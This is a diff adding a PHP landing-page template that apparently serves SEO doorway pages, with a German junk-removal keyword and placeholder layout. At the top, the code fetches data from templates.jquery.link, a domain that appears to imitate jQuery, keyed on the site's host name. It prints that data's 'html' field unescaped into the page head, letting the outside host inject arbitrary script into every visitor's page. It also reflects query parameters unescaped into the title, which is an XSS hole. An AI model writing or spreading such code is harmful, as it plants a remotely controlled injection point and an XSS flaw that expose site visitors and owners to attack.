@@ -1,0 +1,87 @@
+<?php
+$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);
+
+$phone_name     = $site_data['phone_name'];
+$phone_href     = $site_data['phone_href'];
+
+$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Entrumpelung'));
+$city           = str_replace('+', ' ', trim($_GET['n'] ?? 'in der nahe'));
+
+$title = $text . ' ' . $city;
+?>
+
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <?= $site_data['html'] ?>
+    <title>
+        <?= $title ?>
+    </title>
+</head>
+
+<body>
+
+
+    <!--Шапка сайта-->
+    <header class="header">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 container">
+                    <h1 class="header__title">header</h1><!-- + h1-h6. -->
+                </div>
+            </div>
+        </div>
+        <!-- Навигационные ссылки -->
+        <nav class="header-nav">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-12 container">...</div>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!-- Основное содержимое страницы -->
+    <main class="main">
+        <h1 class="main__title">main</h1><!-- - h1-h6. -->
+        <!-- Раздел страницы-->
+        <section class="first-section">
+            <h2 class="first-section__title">section</h2><!-- + h2-h6... -->
+            <article class="first-article">
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col-12 container">
+                            <h2 class="first-article__title">article</h2><!-- + h2-h6... -->
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </section>
+    </main>
+    <!--Нижний колонтитул страницы-->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 container">footer</div>
+            </div>
+        </div>
+        <!-- Навигационные ссылки -->
+        <nav class="footer-nav">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-12 container">...</div>
+                </div>
+            </div>
+        </nav>
+    </footer>
+    <!--Style-->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/css/style.min.css" rel="stylesheet">
+    <script src="app/assets/js/main.min.js"></script>
+</body>
+
+</html>
